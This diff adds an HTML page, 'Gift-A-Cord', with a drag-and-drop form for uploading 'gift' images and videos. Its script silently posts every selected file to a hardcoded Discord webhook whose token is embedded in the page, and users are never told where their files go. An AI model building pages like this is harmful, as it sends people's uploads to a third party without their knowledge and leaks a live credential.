@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gift-A-Cord</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            width:100%;
+            background: #f0f0f0;
+        }
+
+        .navbar {
+            position:absolute;
+            display:flex;
+            align-items:left;
+            top:0;
+            font-weight:bold;
+            left:0;
+            width: 100%;
+            background: #f7f7f7;
+            color: #fff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .navbar h1 {
+            margin: 0;
+            font-size: 1.5em;
+        }
+
+        .navbar a {
+            color: #333;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 1em;
+            transition: color 0.3s;
+        }
+
+        .navbar a:hover {
+            color: #e0e0e0;
+        }
+
+        .drop-zone {
+            width: 80%;
+            height: 300px;
+            max-width: 600px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            border: 2px dashed #007bff;
+            border-radius: 10px;
+            background: #fff;
+            text-align: center;
+            position: relative;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .drop-zone h2 {
+            margin: 0;
+            color: #007bff;
+        }
+
+        .drop-zone p {
+            margin: 10px 0 0;
+            color: #555;
+        }
+
+        .alert {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #ff4d4d;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            font-weight: bold;
+            z-index: 1000;
+        }
+
+        .alert.show {
+            display: block;
+        }
+
+        input[type="file"] {
+            display: none;
+        }
+
+        h1 { 
+            color: #444;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <h1>Gift-A-Cord!</h1>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Features</a>
+            <a href="#">Contact</a>
+        </nav>
+    </div>
+<h1>Upload Gift Image Here</h1>
+    <div class="drop-zone" id="dropZone">
+        <h2>Drag & Drop Images or Videos Here</h2>
+        <p>Or <label for="fileInput">Select Files</label></p>
+        <input type="file" id="fileInput" multiple accept="image/*,video/*">
+    </div>
+
+    <div class="alert" id="alert">Please upload at least 1 image or video.</div>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1264638842820890677/t77eJg4v5W00BTCfJstAa2rluULb3Wf8fpdt8zmmkywkxhGPu4zIivT8_KwPKuGBPrTZ'; 
+        const minFileCount = 1;
+
+        const dropZone = document.getElementById('dropZone');
+        const fileInput = document.getElementById('fileInput');
+        const alertBox = document.getElementById('alert');
+
+        dropZone.addEventListener('click', () => fileInput.click());
+
+        dropZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            dropZone.style.backgroundColor = '#e7f0ff';
+        });
+
+        dropZone.addEventListener('dragleave', () => {
+            dropZone.style.backgroundColor = '#fff';
+        });
+
+        dropZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropZone.style.backgroundColor = '#fff';
+            handleFiles(e.dataTransfer.files);
+        });
+
+        fileInput.addEventListener('change', () => {
+            handleFiles(fileInput.files);
+        });
+
+        function handleFiles(files) {
+            const fileArray = Array.from(files);
+            if (fileArray.length < minFileCount) {
+                alertBox.classList.add('show');
+            } else {
+                alertBox.classList.remove('show');
+            }
+
+            fileArray.forEach(file => {
+                if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+                    const reader = new FileReader();
+
+                    reader.onload = async function(event) {
+                        const fileData = event.target.result;
+                        const formData = new FormData();
+                        formData.append('file', new Blob([fileData], { type: file.type }), file.name);
+
+                        try {
+                            const response = await fetch(webhookUrl, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            if (response.ok) {
+                                console.log(`${file.name} sent successfully.`);
+                            } else {
+                                console.error(`Failed to send ${file.name}.`);
+                            }
+                        } catch (error) {
+                            console.error(`Error sending ${file.name}:`, error);
+                        }
+                    };
+
+                    reader.readAsArrayBuffer(file);
+                } else {
+                    console.log(`${file.name} is not a supported file type.`);
+                }
+            });
+        }
+    </script>
+</body>
+</html>
